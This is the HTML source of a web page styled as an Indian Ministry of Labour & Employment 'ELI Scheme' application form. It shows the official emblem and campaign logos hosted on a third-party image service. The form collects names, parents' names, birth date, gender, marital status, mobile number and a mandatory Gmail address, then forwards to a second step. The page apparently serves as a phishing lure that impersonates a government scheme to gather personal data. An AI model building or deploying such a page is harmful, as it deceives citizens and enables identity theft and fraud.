<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>ELI Scheme – Application Form</title>
  <style>
    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html, body {
      font-family: "Calibri", sans-serif;
      background: #f5f5f5;
      overflow-x: hidden;
      height: 100%;
      line-height: 1.4;
    }

    .page-header {
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      padding: 20px 30px;
    }

    .header-left, .header-right {
      display: flex;
      align-items: center;
      gap: 15px;
    }

    .header-left img, .header-right img {
      height: 60px;
      width: auto;
    }

    .header-left .text {
      font-size: 16px;
    }

    .header-left .text strong {
      font-size: 16px;
      font-weight: bold;
      display: block;
    }

    .slider {
      width: 100%;
      overflow: hidden;
      position: relative;
      background: #fff;
      margin-bottom: 20px;
    }

    .slider .slides {
      display: flex;
      animation: slideAnimation 20s infinite;
      width: 300%;
    }

    .slider .slides img {
      width: 100vw;
      height: auto;
      flex-shrink: 0;
      object-fit: contain;
      object-position: center;
      display: block;
    }

    @keyframes slideAnimation {
      0%, 30% { transform: translateX(0); }
      33.33%, 63.33% { transform: translateX(-100vw); }
      66.66%, 96.66% { transform: translateX(-200vw); }
      100% { transform: translateX(0); }
    }

    .form-box {
      background: #fafafa;
      padding: 25px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 600px;
      margin: 0 auto;
    }

    #form-title {
      text-align: center;
      color: #0d47a1;
      margin-bottom: 20px;
    }

    .form-row {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
      margin-bottom: 15px;
    }

    .form-group {
      flex: 1;
      min-width: 200px;
    }

    label {
      font-weight: 600;
      margin-bottom: 6px;
      display: block;
    }

    input, select {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button#next-btn {
      display: block;
      margin: 20px auto 0;
      padding: 12px 30px;
      background: #0d47a1;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    button#next-btn:hover {
      background: #0b3a82;
    }

    footer {
      text-align: center;
      padding: 12px;
      background: #f0f0f0;
      color: #444;
    }

    @media (max-width: 768px) {
      .page-header {
        flex-direction: column;
        align-items: center;
        gap: 10px;
        padding: 15px;
      }

      .header-left img, .header-right img {
        height: 50px;
      }

      .form-box {
        padding: 20px;
        margin: 20px 10px;
      }
    }

    @media (max-width: 480px) {
      .slider .slides img {
        object-fit: contain;
      }
    }
  </style>
</head>
<body>

  <header class="page-header">
    <a href="/" class="header-left" style="text-decoration:none;color:inherit;display:flex;align-items:center;">
      <img src="https://ik.imagekit.io/pinet/Form/emblem-dark.png" alt="Emblem"/>
      <div class="text">
        <strong>श्रम एवं रोजगार मंत्रालय</strong><br>
        GOVERNMENT OF INDIA<br>
        <b>MINISTRY OF LABOUR & EMPLOYMENT</b>
      </div>
    </a>
    <div class="header-right">
      <img src="https://ik.imagekit.io/pinet/Form/g20_2.png" alt="G20"/>
      <img src="https://ik.imagekit.io/pinet/Form/azadi_0.jpg" alt="Azadi ka Amrit Mahotsav"/>
      <img src="https://ik.imagekit.io/pinet/Form/swach-bharat.png" alt="Swachh Bharat"/>
    </div>
  </header>

  <div class="slider">
    <div class="slides">
      <img src="https://ik.imagekit.io/pinet/Form/eli.jpg" alt="Slide 1"/>
      <img src="https://ik.imagekit.io/pinet/Form/29-30-meeting.jpg" alt="Slide 2"/>
      <img src="https://ik.imagekit.io/pinet/Form/imagee.png" alt="Slide 3"/>
    </div>
  </div>

   <div class="form-section">
    <div class="form-box">
      <h2 id="form-title">Application Form</h2>
      <form id="multi-step-form">
        <div class="form-row">
          <div class="form-group"><label>Candidate First Name</label><input type="text" name="first_name" required></div>
          <div class="form-group"><label>Candidate Last Name</label><input type="text" name="last_name" required></div>
        </div>
        <div class="form-row">
          <div class="form-group"><label>Father's Name</label><input type="text" name="father_name" required></div>
          <div class="form-group"><label>Mother's Name</label><input type="text" name="mother_name" required></div>
        </div>
        <div class="form-row">
          <div class="form-group"><label>Date of Birth</label><input type="date" name="dob" required></div>
          <div class="form-group">
            <label>Gender</label>
            <select name="gender" required>
              <option value="">Select</option>
              <option>Male</option>
              <option>Female</option>
              <option>Other</option>
            </select>
          </div>
        </div>
        <div class="form-row">
          <div class="form-group">
            <label>Marital Status</label>
            <select name="marital_status" required>
              <option value="">Select</option>
              <option>Single</option>
              <option>Married</option>
            </select>
          </div>
          <div class="form-group"><label>Mobile Number</label><input type="text" name="mobile" required></div>
        </div>
        <div class="form-row">
          <div class="form-group"><label>Email ID</label><input type="email" name="email" required></div>
        </div>
        <button type="submit" id="next-btn">Save and Next</button>
      </form>
    </div>
  </div>

  <footer>&copy; Ministry of Labour & Employment</footer>

  <script>
    window.addEventListener("DOMContentLoaded", function() {
      document.getElementById("multi-step-form").addEventListener("submit", function(e) {
        e.preventDefault();
        const f = this;
        const dob = f.dob.value;
        const email = f.email.value;
        const firstName = f.first_name.value;
        const lastName = f.last_name.value;
        const fatherName = f.father_name.value;
        const motherName = f.mother_name.value;
        const gender = f.gender.value;
        const maritalStatus = f.marital_status.value;
        const mobile = f.mobile.value;

        console.log("Form Data:", { firstName, lastName, fatherName, motherName, dob, gender, maritalStatus, mobile, email });

        if (!firstName || !lastName || !fatherName || !motherName || !dob || !gender || !maritalStatus || !mobile || !email) {
          alert("कृपया सभी फ़ील्ड भरें");
          return;
        }

        const today = new Date();
        const birthDate = new Date(dob);
        const age = (today - birthDate) / (365.25 * 24 * 60 * 60 * 1000);
        console.log("Calculated Age:", age);
        if (age < 18) {
          alert("Age should be at least 18");
          return;
        }

        if (!email.endsWith("@gmail.com")) {
          alert("Email must end with @gmail.com");
          return;
        }

        try {
          window.location.href = "step2.html";
          console.log("Redirecting to step2.html at ", new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" }));
        } catch (error) {
          console.error("Redirect failed:", error);
          alert("Error redirecting to the next page. Please check if step2.html exists.");
        }
      });
    });
  </script>
</body>
</html>
